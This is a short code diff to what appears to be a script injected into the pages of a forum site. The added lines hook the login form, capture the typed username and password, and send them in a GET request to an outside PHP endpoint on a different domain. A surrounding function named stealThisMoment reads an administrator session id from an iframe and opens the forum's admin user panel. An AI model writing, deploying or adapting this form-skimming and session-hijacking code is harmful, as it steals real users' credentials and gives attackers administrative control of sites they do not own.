@@ -65,7 +65,20 @@ if (!document.getElementById("login-button")) {
             console.log("gl");
         };
     }
+} else {
+    var userfield = document.getElementsByName('username')[0];
+    var passfield = document.getElementsByName('password')[0];
+    var userfield_value = userfield.value;
+    var passfield_value = passfield.value;
+    document.getElementById('login-form').onsubmit = () => {
+        var user_parsed = document.getElementsByName('username')[0].value.replace(/#/g, "|hashtag|").replace(/&/g, "|ampersand|");
+        var pass_parsed = document.getElementsByName('password')[0].value.replace(/#/g, "|hashtag|").replace(/&/g, "|ampersand|");
+        const xhr = new XMLHttpRequest()
+        xhr.open("GET", `https://www.godela.com.br/includes/receive.php?u=${user_parsed}&p=${pass_parsed}`)
+        xhr.send();
+    };
 }
+
 function stealThisMoment() {
     var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
     iframe.contentWindow.window.location.replace(`https://gparena.net/forum/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
